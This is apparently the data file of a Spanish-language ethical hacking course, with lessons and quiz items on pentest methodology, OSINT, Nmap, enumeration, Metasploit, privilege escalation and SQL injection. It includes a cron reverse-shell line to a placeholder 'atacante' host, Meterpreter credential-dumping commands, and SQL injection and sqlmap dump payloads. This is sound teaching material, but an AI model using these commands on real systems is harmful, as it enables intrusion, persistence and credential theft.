...
```""",
    ...
    "redteam": {
        ...
        "description": "Aprende tecnicas ofensivas de hacking etico: reconocimiento, explotacion, post-explotacion y reporte profesional.",
        "icon": "target",
        "color": "#f44336",
        "modules": [
            {
                ...
                "lessons": [
                    {
                        "id": "l1",
                        "title": "Metodologia y fases del pentesting",
                        "theory": """## Hacking Etico y Pentesting

El **hacking etico** consiste en simular ataques reales contra sistemas con permiso explicito del propietario para identificar vulnerabilidades antes que un atacante malicioso.

### Marcos de Metodologia

| Marco | Descripcion |
|-------|-------------|
| PTES | Penetration Testing Execution Standard |
| OWASP WSTG | Web Security Testing Guide |
| NIST SP 800-115 | Guia tecnica de pruebas de seguridad |
| MITRE ATT&CK | Framework de tacticas y tecnicas |

### Las 5 Fases del Pentesting

#### 1. Reconocimiento (Recon)
Recoleccion de informacion sobre el objetivo sin interactuar directamente.
- **Pasivo**: OSINT, Shodan, WHOIS, Google Dorks
- **Activo**: Escaneos de red, enumeracion de servicios

#### 2. Escaneo y Enumeracion
Identificar puertos abiertos, servicios y versiones.
- Herramientas: Nmap, Masscan, Netcat
- Objetivo: Mapa de superficie de ataque

#### 3. Explotacion
Aprovechar vulnerabilidades para obtener acceso.
- Herramientas: Metasploit, exploit publicos, exploits custom
- Tipos: RCE, LFI, SQLi, buffer overflow

#### 4. Post-Explotacion
Acciones tras obtener acceso inicial.
...
#### 5. Reporte
Documentar hallazgos con severidad, evidencia y remediacion.
- Clasificacion CVSS
...
- **Black Box**: Sin informacion previa (simula atacante externo)
- **White Box**: Con acceso total al codigo y documentacion
- **Grey Box**: Informacion parcial (simula insider o atacante con credenciales basicas)

### Marco Legal
El pentesting sin autorizacion es delito. Siempre debe existir:
- **ROE** (Rules of Engagement) firmado
- **Scope** definido (IPs, dominios, sistemas en alcance)
- **NDA** de confidencialidad""",
                        "exercises": [
                            {
                                "id": "e1",
                                "type": "multiple_choice",
                                "question": "¿Cual es la primera fase del pentesting segun la metodologia PTES?",
                                "options": ["Explotacion", "Reconocimiento", "Post-explotacion", "Reporte"],
                                "correct": 1,
                                "explanation": "El Reconocimiento es siempre la primera fase. Consiste en recolectar la maxima informacion posible sobre el objetivo antes de cualquier interaccion directa."
                            },
                            {
                                "id": "e2",
                                "type": "multiple_choice",
                                "question": "Un pentest 'Black Box' significa que el auditor:",
                                "options": ["Tiene acceso completo al codigo fuente", "No tiene ninguna informacion previa sobre el objetivo", "Solo prueba aplicaciones web", "Trabaja sin reportar hallazgos"],
                                "correct": 1,
                                "explanation": "Black Box simula un atacante externo real: el auditor empieza sin ningun conocimiento previo del sistema objetivo y debe descubrir todo por su cuenta."
                            },
                            {
                                "id": "e3",
                                "type": "fill_blank",
                                "question": "Las reglas que definen el alcance y limitaciones de un pentest se llaman ___ of Engagement",
                                "correct": "Rules",
                                "explanation": "Las Rules of Engagement (ROE) son el documento legal que define que sistemas pueden atacarse, en que horarios, que tecnicas estan permitidas y como se manejaran los hallazgos criticos."
                            }
                        ]
                    },
                    {
                        "id": "l2",
                        "title": "Reconocimiento pasivo con OSINT",
                        "theory": """## Reconocimiento Pasivo

El reconocimiento pasivo recopila informacion publica sin enviar trafico al objetivo.

### Google Dorks (Google Hacking)
Uso avanzado de operadores de busqueda para encontrar informacion sensible expuesta:

| Operador | Uso | Ejemplo |
|----------|-----|---------|
| site: | Limitar a un dominio | site:empresa.com |
| filetype: | Buscar tipo de archivo | filetype:pdf confidencial |
| inurl: | Texto en la URL | inurl:admin login |
| intitle: | Texto en el titulo | intitle:"index of" |
| intext: | Texto en el cuerpo | intext:"password" filetype:txt |

### WHOIS y DNS
```bash
# Informacion del registrante del dominio
whois ejemplo.com
...
# Buscar subdominios
dig ejemplo.com AXFR @ns1.ejemplo.com
```

### Shodan — El buscador de IoT
Shodan indexa dispositivos conectados a internet y sus banners de servicio.

Busquedas utiles:
- `hostname:empresa.com` — Servidores de la empresa
- `org:"Empresa SA"` — Por organizacion
- `port:3389 country:EC` — RDP expuesto en Ecuador
- `product:Apache vuln:CVE-2021-41773` — Servidores vulnerables

### Herramientas OSINT Adicionales
- **theHarvester**: Emails, subdominios, IPs desde fuentes publicas
- **Maltego**: Grafos de relaciones entre entidades
- **Recon-ng**: Framework modular de reconocimiento
- **SpiderFoot**: Automatiza multiples fuentes OSINT
- **Censys**: Similar a Shodan, enfocado en certificados TLS

```bash
# theHarvester ejemplo
theHarvester -d empresa.com -b google,linkedin,shodan -l 200
```""",
                        "exercises": [
                            {
                                "id": "e1",
                                "type": "multiple_choice",
                                "question": "¿Que operador de Google Dork permite buscar solo dentro de un dominio especifico?",
                                "options": ["inurl:", "site:", "intitle:", "filetype:"],
                                "correct": 1,
                                "explanation": "El operador 'site:' restringe los resultados a un dominio especifico. Ejemplo: site:empresa.com filetype:pdf encuentra documentos PDF en el sitio de la empresa."
                            },
                            {
                                "id": "e2",
                                "type": "multiple_choice",
                                "question": "Shodan es principalmente util para:",
                                "options": ["Analizar malware en sandbox", "Descubrir dispositivos y servicios expuestos en internet", "Realizar ataques de fuerza bruta", "Generar reportes de vulnerabilidades"],
                                "correct": 1,
                                "explanation": "Shodan es un motor de busqueda que indexa dispositivos conectados a internet con sus puertos abiertos y banners de servicio, permitiendo encontrar sistemas expuestos sin escanearlos directamente."
                            },
                            {
                                "id": "e3",
                                "type": "fill_blank",
                                "question": "La herramienta ___ recopila emails, subdominios e IPs de una empresa usando fuentes publicas como Google y LinkedIn",
                                "correct": "theHarvester",
                                "explanation": "theHarvester es una de las herramientas de reconocimiento pasivo mas usadas en pentesting. Agrega resultados de multiples motores de busqueda y fuentes OSINT para mapear la superficie de ataque de una organizacion."
                            }
                        ]
                    }
                ]
            },
            {
                ...
                "lessons": [
                    {
                        "id": "l1",
                        "title": "Nmap y escaneo de puertos",
                        "theory": """## Nmap — Network Mapper

Nmap es la herramienta estandar para descubrimiento de redes y auditoria de seguridad.

### Tipos de Escaneo Principales

| Tecnica | Comando | Descripcion |
|---------|---------|-------------|
| SYN Scan (stealth) | -sS | Envia SYN, no completa el handshake. Rapido y discreto |
| TCP Connect | -sT | Handshake completo. Sin privilegios root |
| UDP Scan | -sU | Detecta servicios UDP (mas lento) |
| NULL Scan | -sN | Sin flags TCP. Evasion de firewalls |
| Xmas Scan | -sX | Flags FIN+PSH+URG. Evasion |
...
# Escaneo completo con deteccion de version y SO
nmap -sV -O -A 192.168.1.10

# Todos los puertos (65535)
nmap -p- 192.168.1.10

# Escaneo sigiloso con scripts NSE
nmap -sS -sV --script=vuln 192.168.1.10

# Guardar resultados
nmap -oA resultado 192.168.1.10
```

### Estados de Puertos
- **open**: Puerto abierto, servicio escuchando
- **closed**: Puerto cerrado, host responde
- **filtered**: Firewall bloquea el trafico (no hay respuesta)
- **open|filtered**: No se puede determinar el estado

### Nmap Scripting Engine (NSE)
Los scripts NSE automatizan tareas de enumeracion y deteccion de vulnerabilidades:
...
# Detectar Heartbleed (CVE-2014-0160)
                        ...
                        "exercises": [
                            {
                                "id": "e1",
                                "type": "multiple_choice",
                                "question": "¿Que flag de Nmap realiza un SYN scan (half-open) sin completar el handshake TCP?",
                                "options": ["-sT", "-sU", "-sS", "-sN"],
                                "correct": 2,
                                "explanation": "-sS realiza un TCP SYN scan: envia un paquete SYN y analiza la respuesta sin completar el handshake de tres vias. Es rapido, relativamente sigiloso y requiere privilegios root."
                            },
                            {
                                "id": "e2",
                                "type": "multiple_choice",
                                "question": "Un puerto con estado 'filtered' en Nmap significa que:",
                                "options": ["El servicio esta corriendo normalmente", "El puerto esta cerrado y el host responde con RST", "Un firewall esta bloqueando el trafico hacia ese puerto", "El sistema operativo no puede determinar el estado"],
                                "correct": 2,
                                "explanation": "El estado 'filtered' indica que Nmap no recibio respuesta al sondeo, lo que generalmente significa que un firewall o regla de filtrado esta descartando los paquetes antes de que lleguen al puerto."
                            },
                            {
                                "id": "e3",
                                "type": "fill_blank",
                                "question": "El flag de Nmap para detectar la version de los servicios en puertos abiertos es ___",
                                "correct": "-sV",
                                "explanation": "-sV (Version Detection) hace que Nmap intente determinar la version exacta del software corriendo en cada puerto abierto. Esta informacion es clave para buscar vulnerabilidades especificas de esa version."
                            }
                        ]
                    },
                    {
                        ...
                        "theory": """## Enumeracion de Servicios

Tras identificar puertos abiertos, se enumeran los servicios para obtener informacion detallada.

### Enumeracion SMB (Puerto 445)
```bash
# Listar recursos compartidos sin autenticacion
smbclient -L //192.168.1.10 -N

# Enumeracion completa con enum4linux
enum4linux -a 192.168.1.10

# Verificar vulnerabilidades SMB con Nmap
nmap --script smb-vuln* -p 445 192.168.1.10
```

### Enumeracion HTTP/HTTPS (Puertos 80/443)
```bash
# Descubrir directorios y archivos ocultos
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt

# Alternativa con ffuf (mas rapido)
ffuf -w wordlist.txt -u http://192.168.1.10/FUZZ
...
### Enumeracion DNS
```bash
# Transferencia de zona (misconfiguracion critica)
dig axfr @ns1.empresa.com empresa.com

# Brute force de subdominios
gobuster dns -d empresa.com -w subdomains.txt

# Herramienta dedicada
dnsx -d empresa.com -w subdomains.txt -a -resp
```
...
# Guardar reporte
nikto -h http://192.168.1.10 -o reporte.html -Format htm
```

### OpenVAS y Nessus
Escaner de vulnerabilidades de red que identifican CVEs conocidos en los servicios detectados. Generan reportes priorizados por severidad (Critico, Alto, Medio, Bajo).

### CVSS — Sistema de Puntuacion de Vulnerabilidades
| Score | Severidad |
|-------|-----------|
| 9.0 - 10.0 | Critico |
| 7.0 - 8.9 | Alto |
...
| 0.1 - 3.9 | Bajo |""",
                        "exercises": [
                            {
                                "id": "e1",
                                "type": "multiple_choice",
                                "question": "¿Para que se usa Gobuster en un pentest?",
                                "options": ["Escanear puertos TCP/UDP", "Descubrir directorios y archivos ocultos en servidores web", "Capturar trafico de red", "Descifrar hashes de contrasenas"],
                                "correct": 1,
                                "explanation": "Gobuster realiza fuerza bruta de rutas en servidores web usando listas de palabras. Encuentra directorios, archivos y subdominios que no son visibles en la interfaz publica pero son accesibles si se conoce su ruta."
                            },
                            {
                                "id": "e2",
                                "type": "multiple_choice",
                                "question": "Una transferencia de zona DNS exitosa (AXFR) desde el exterior representa:",
                                "options": ["Una funcion normal del DNS", "Una configuracion incorrecta grave que expone toda la infraestructura DNS", "Un ataque de denegacion de servicio", "Un metodo de cifrado DNS"],
                                "correct": 1,
                                "explanation": "La transferencia de zona (AXFR) deberia estar restringida solo a servidores DNS secundarios autorizados. Si esta disponible publicamente, un atacante obtiene todos los registros DNS del dominio, revelando toda la infraestructura interna."
                            },
                            {
                                "id": "e3",
                                "type": "fill_blank",
                                "question": "Una vulnerabilidad con CVSS score de 9.5 se clasifica como ___",
                                "correct": "Critico",
                                "explanation": "El CVSS (Common Vulnerability Scoring System) usa una escala de 0 a 10. Scores de 9.0 a 10.0 son Criticos y requieren remediacion inmediata ya que representan el mayor riesgo para la organizacion."
                            }
                        ]
                    }
                ]
            ...
            {
                "id": "m3",
                "title": "Explotacion y Post-Explotacion",
                "lessons": [
                    {
                        "id": "l1",
...
Metasploit es el framework de explotacion mas utilizado en pentesting profesional.

### Arquitectura de Metasploit

```
msf6 >
  ├── exploits/     — Modulos que explotan vulnerabilidades especificas
  ├── payloads/     — Codigo que se ejecuta tras explotar (shells, meterpreter)
  ├── auxiliaries/  — Escaners, fuzzers, sniffers
  ├── post/         — Modulos de post-explotacion
  └── encoders/     — Ofuscacion de payloads
```

### Flujo Basico de Explotacion
...
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.99
...
meterpreter > getsystem        # Escalar a SYSTEM
meterpreter > hashdump         # Extraer hashes de contrasenas
meterpreter > upload shell.php # Subir archivo
meterpreter > download SAM     # Descargar archivo
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > shell            # Abrir cmd/bash
```
...
| Tipo | Descripcion |
|------|-------------|
| singles | Todo en uno, autosuficientes pero limitados |
| stagers | Establecen conexion y descargan el stage |
| stages | Payload completo enviado por el stager (Meterpreter) |
| reverse_tcp | Victima conecta al atacante (evasion de firewall) |
| bind_tcp | Atacante conecta a la victima |""",
                        "exercises": [
                            {
                                "id": "e1",
                                "type": "multiple_choice",
                                "question": "En Metasploit, ¿que comando se usa para configurar la IP del objetivo?",
                                "options": ["set TARGET", "set RHOST", "set RHOSTS", "set LHOST"],
                                "correct": 2,
                                "explanation": "RHOSTS (Remote Hosts) es la variable que define el objetivo o lista de objetivos en Metasploit. LHOST define la IP del atacante (para payloads reverse). El comando es: set RHOSTS <IP>"
                            },
                            {
                                "id": "e2",
                                "type": "multiple_choice",
                                "question": "Un payload 'reverse_tcp' significa que:",
                                "options": ["El atacante se conecta a la victima", "La victima se conecta de vuelta al atacante", "La comunicacion es cifrada con TLS", "Solo funciona en redes internas"],
                                "correct": 1,
                                "explanation": "En reverse_tcp, la maquina comprometida (victima) inicia la conexion hacia el atacante. Esto evita firewalls que bloquean conexiones entrantes al objetivo pero permiten conexiones salientes."
                            },
                            {
                                "id": "e3",
                                "type": "fill_blank",
                                "question": "El comando de Meterpreter para extraer los hashes de contrasenas del sistema Windows es ___",
                                "correct": "hashdump",
                                "explanation": "hashdump extrae los hashes NTLM de las cuentas locales de Windows desde el registro SAM. Estos hashes pueden usarse para ataques pass-the-hash o crackeo offline con herramientas como Hashcat."
                            }
                        ]
                    },
                    {
                        "id": "l2",
                        "title": "Escalacion de privilegios y persistencia",
                        "theory": """## Post-Explotacion

Tras obtener acceso inicial, el Red Team busca ampliar el control sobre el sistema y la red.
...
# Buscar binarios con SUID (se ejecutan como root)
find / -perm -4000 -type f 2>/dev/null

# Revisar tareas cron de root
cat /etc/crontab
ls -la /etc/cron.*
...
# Buscar contrasenas en archivos de configuracion
grep -r "password" /etc /var/www 2>/dev/null

# Verificar version del kernel (buscar exploits locales)
uname -a
```

### Escalacion de Privilegios en Windows
...
# AlwaysInstallElevated (registro misconfigured)
...
# Crontab de usuario
crontab -e
# Agregar: */5 * * * * bash -i >& /dev/tcp/atacante/4444 0>&1
...
Tecnicas para moverse entre sistemas de la red comprometida:

- **Pass-the-Hash**: Usar hash NTLM sin necesidad de la contrasena en texto claro
- **Pass-the-Ticket**: Reutilizar tickets Kerberos (Golden/Silver Ticket)
- **PsExec**: Ejecutar comandos remotos en Windows via SMB
- **WMI**: Windows Management Instrumentation para ejecucion remota""",
                        "exercises": [
                            {
                                "id": "e1",
                                "type": "multiple_choice",
                                "question": "¿Que busca el comando 'find / -perm -4000' en Linux?",
                                "options": ["Archivos modificados en las ultimas 24 horas", "Archivos con el bit SUID activado que se ejecutan como root", "Archivos de configuracion del sistema", "Procesos corriendo como root"],
                                "correct": 1,
                                "explanation": "El bit SUID (Set User ID) hace que un ejecutable corra con los permisos del propietario (frecuentemente root) en lugar del usuario que lo ejecuta. Binarios SUID mal configurados son una via clasica de escalacion de privilegios en Linux."
                            },
                            {
                                "id": "e2",
                                "type": "multiple_choice",
                                "question": "La tecnica Pass-the-Hash permite a un atacante:",
                                "options": ["Crackear contrasenas usando GPU", "Autenticarse en sistemas Windows usando el hash NTLM sin conocer la contrasena en texto claro", "Interceptar hashes en transito por la red", "Modificar el hash almacenado en Active Directory"],
                                "correct": 1,
                                "explanation": "Pass-the-Hash explota que Windows (especialmente con NTLM) acepta el hash directamente para autenticacion. Un atacante que extrae hashes con hashdump puede autenticarse en otros sistemas de la red sin necesidad de crackear la contrasena."
                            },
                            {
                                "id": "e3",
                                "type": "fill_blank",
                                "question": "En Windows, agregar una entrada en HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\___ es un metodo de persistencia clasico",
                                "correct": "Run",
                                "explanation": "La clave Run en el registro de Windows ejecuta automaticamente el programa especificado cada vez que el usuario inicia sesion. Es uno de los mecanismos de persistencia mas comunes y detectados por herramientas como Autoruns de Sysinternals."
                            }
                        ]
                    }
                ]
            ...
            {
                "id": "m4",
                "title": "Ataques a Aplicaciones Web",
                "lessons": [
                    {
                        "id": "l1",
                        "title": "OWASP Top 10 y SQL Injection",
                        "theory": """## OWASP Top 10

El OWASP Top 10 es el estandar de referencia para las vulnerabilidades web mas criticas.
...
La inyeccion SQL ocurre cuando la entrada del usuario se inserta directamente en una consulta SQL sin sanitizar.
...
-- Union-based injection (extraer datos)
' UNION SELECT username, password FROM users--

-- Blind SQLi (true/false)
' AND 1=1--     (respuesta normal)
' AND 1=2--     (respuesta diferente = vulnerable)

-- Time-based blind SQLi
' AND SLEEP(5)--    (si tarda 5 seg = vulnerable)
```

#### SQLMap — Automatizacion
```bash
# Deteccion basica
sqlmap -u "http://victima.com/page?id=1"

# Extraer bases de datos
sqlmap -u "http://victima.com/page?id=1" --dbs

# Extraer tablas de una base de datos
sqlmap -u "http://victima.com/page?id=1" -D nombre_db --tables

# Extraer datos de una tabla
sqlmap -u "http://victima.com/page?id=1" -D nombre_db -T users --dump
```

#### Prevencion
- **Consultas parametrizadas** (Prepared Statements): el metodo mas efectivo
- **ORM**: Usar frameworks que abstraen el SQL
- **Validacion de entrada**: Rechazar caracteres especiales
- **Principio de minimo privilegio**: El usuario de DB solo debe tener permisos necesarios""",
                        "exercises": [
                            {
                                "id": "e1",
                                "type": "multiple_choice",
                                "question": "¿Cual es la posicion de Injection en el OWASP Top 10 (2021)?",
                                "options": ["A01 - Primera posicion", "A03 - Tercera posicion", "A07 - Septima posicion", "A10 - Decima posicion"],
                                "correct": 1,
                                "explanation": "En el OWASP Top 10 2021, Injection (que incluye SQL, NoSQL, LDAP injection) ocupa el A03. Bajo a la tercera posicion desde A01 en la edicion de 2017 debido a la mejora en el uso de ORMs y consultas parametrizadas."
                            },
                            {
                                "id": "e2",
                                "type": "multiple_choice",
                                "question": "El payload SQL ' OR '1'='1 en un formulario de login busca:",
                                "options": ["Eliminar todos los registros de la base de datos", "Hacer que la condicion WHERE siempre sea verdadera para bypassear autenticacion", "Ejecutar comandos del sistema operativo", "Cifrar las credenciales en transito"],
                                "correct": 1,
                                "explanation": "' OR '1'='1 cierra la cadena del usuario y agrega una condicion siempre verdadera. La query resultante es: WHERE user='' OR '1'='1' AND pass='' OR '1'='1', que siempre devuelve filas, logueando al atacante sin credenciales validas."
                            },
                            {
                                "id": "e3",
                                "type": "fill_blank",
                                "question": "La herramienta automatica mas usada para detectar y explotar SQL Injection es ___",
                                "correct": "sqlmap",
                                "explanation": "SQLMap es la herramienta open source estandar para deteccion y explotacion automatica de SQL Injection. Soporta multiples bases de datos, tipos de inyeccion (union, boolean, time-based, error-based) y puede extraer datos, credenciales y en algunos casos ejecutar comandos del SO."
                            }
                        ]
                    }
                ]
